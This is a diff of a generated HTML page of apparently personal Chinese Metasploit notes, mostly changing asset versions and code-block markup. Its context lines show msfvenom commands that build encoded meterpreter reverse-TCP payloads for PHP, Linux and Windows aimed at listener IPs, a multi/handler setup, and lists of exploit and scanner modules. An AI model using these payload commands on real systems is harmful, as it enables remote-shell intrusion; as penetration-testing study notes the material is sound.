@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.2">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -2769,12 +2769,12 @@ MS11-058 MS12-020</p>
 <code>showt arget</code> 显示目标类型<br />
 <code>set target</code> 设置目标  </p>
 <h2 id="_1">数据库链接<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span> db_connect msf:hack-money@127.0.0.1/msf2
-</pre></div>
+<div class="codehilite"><pre><span></span><code> db_connect msf:hack-money@127.0.0.1/msf2
+</code></pre></div>
 
 <h2 id="_2">资料<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
 <p>TODO
-<div class="codehilite"><pre><span></span>    https://zhuanlan.zhihu.com/p/25857679
+<div class="codehilite"><pre><span></span><code>    https://zhuanlan.zhihu.com/p/25857679
     http://www.kali.org.cn/thread-20133-1-1.html
     http://blog.csdn.net/lijia111111/article/details/64124693
     https://github.com/Veil-Framework/Veil-Evasion
@@ -2783,7 +2783,7 @@ MS11-058 MS12-020</p>
     http://blog.csdn.net/lzhd24/article/details/50664342
     http://www.freebuf.com/sectool/72135.html
     http://blog.csdn.net/ski_12/article/details/57400687
-</pre></div></p>
+</code></pre></div></p>
 <h2 id="_3">命令解释<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
 <p><code>msf&gt;show exploit</code>显示metasploit框架中所有可用的渗透攻击模块。</p>
 <p><code>msf&gt;show auxiliary</code>
@@ -2805,11 +2805,11 @@ setg命令和unsetg命令能够全局参数进行设置或清楚。使用这组�
 （保存在/root/.msf3/config）</p>
 <h1 id="msfvenom">msfvenom<a class="headerlink" href="#msfvenom" title="Permanent link">&para;</a></h1>
 <p>metasploit 更新后就移除了 msfencode 以及 msfpayload</p>
-<div class="codehilite"><pre><span></span>http://www.freebuf.com/sectool/69362.html
+<div class="codehilite"><pre><span></span><code>http://www.freebuf.com/sectool/69362.html
 http://blog.51cto.com/biock/1658668
 http://www.secist.com/archives/1070.html
 http://blog.csdn.net/lijia111111/article/details/64124693
-</pre></div>
+</code></pre></div>
 
 
 <h2 id="_4">目录规则<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
@@ -2824,18 +2824,18 @@ http://blog.csdn.net/lijia111111/article/details/64124693
 <li>payload<br />
 <em><code>payload</code>是使用模块后使用的</em>,<br />
 命名规则:系统/类型/名称<br />
-        类型命名规则:  <div class="codehilite"><pre><span></span>        `shell`:上传一个shell
+        类型命名规则:  <div class="codehilite"><pre><span></span><code>        `shell`:上传一个shell
         `dllinject`:注入要给DLL到进程
         `Patchup***`:修补漏洞
         `Upexec`:上传并执行一个文件
         `Meterpreter`:高级payload
         `Vncinject`:同上
         `PassiveX`:同上
-</pre></div>
+</code></pre></div>
 
 
 <h2 id="_5">扫描模块<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span>`portscan` 端口扫描  
+<div class="codehilite"><pre><span></span><code>`portscan` 端口扫描  
 `sniffer` 嗅探
 auxiliary/scanner/portscan
 scanner/portscan/ack
@@ -2910,31 +2910,31 @@ Module auxiliary/scanner/http/verb_auth_bypass
 web 应用程序漏洞扫描模块
 Module auxiliary/scanner/http/blind_sql_query Module auxiliary/scanner/http/error_sql_injection Module auxiliary/scanner/http/http_traversal
 Module auxiliary/scanner/http/rails_mass_assignment Module exploit/multi/http/lcms_php_exec
-</pre></div>
+</code></pre></div>
 
 
 </li>
 </ol>
 <h2 id="payload">payload生成<a class="headerlink" href="#payload" title="Permanent link">&para;</a></h2>
 <h3 id="php-rev">php rev<a class="headerlink" href="#php-rev" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>msfvenom -p php/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">119</span>.29.226.211 <span class="nv">LPORT</span><span class="o">=</span><span class="m">2341</span> -f raw &gt; shell.php
+<div class="codehilite"><pre><span></span><code>msfvenom -p php/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">119</span>.29.226.211 <span class="nv">LPORT</span><span class="o">=</span><span class="m">2341</span> -f raw &gt; shell.php
 cat shell.php <span class="p">|</span> pbcopy <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">&#39;&lt;?php &#39;</span> <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span> &gt; shell.php <span class="o">&amp;&amp;</span> pbpaste &gt;&gt; shell.php
-</pre></div>
+</code></pre></div>
 
 <h3 id="linux">linux<a class="headerlink" href="#linux" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>msfvenom -p payload/linux/x86/meterpreter/reverse_tcp  <span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.0.120 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4433</span> -f elf &gt;shell.elf
-</pre></div>
+<div class="codehilite"><pre><span></span><code>msfvenom -p payload/linux/x86/meterpreter/reverse_tcp  <span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.0.120 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4433</span> -f elf &gt;shell.elf
+</code></pre></div>
 
 <h3 id="win">win<a class="headerlink" href="#win" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i <span class="m">5</span> -b ‘<span class="se">\x</span><span class="m">00</span>’ <span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.203.139 <span class="nv">LPORT</span><span class="o">=</span><span class="m">2341</span> -f exe &gt; abc.exe
-</pre></div>
+<div class="codehilite"><pre><span></span><code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i <span class="m">5</span> -b ‘<span class="se">\x</span><span class="m">00</span>’ <span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.203.139 <span class="nv">LPORT</span><span class="o">=</span><span class="m">2341</span> -f exe &gt; abc.exe
+</code></pre></div>
 
 <h3 id="_6">监听<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>use exploit/multi/handler
+<div class="codehilite"><pre><span></span><code>use exploit/multi/handler
 <span class="nb">set</span> payload 
 sey LHOST
 <span class="nb">set</span> LPORT
-</pre></div>
+</code></pre></div>
 
 <h3 id="_7">后渗透过程<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
 <p><a href="https://zhuanlan.zhihu.com/p/31060056">https://zhuanlan.zhihu.com/p/31060056</a>
@@ -3042,7 +3042,7 @@ Linux /var/log/ lastlog wtmp btmp</p>
       
     </div>
     
-      <script src="../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
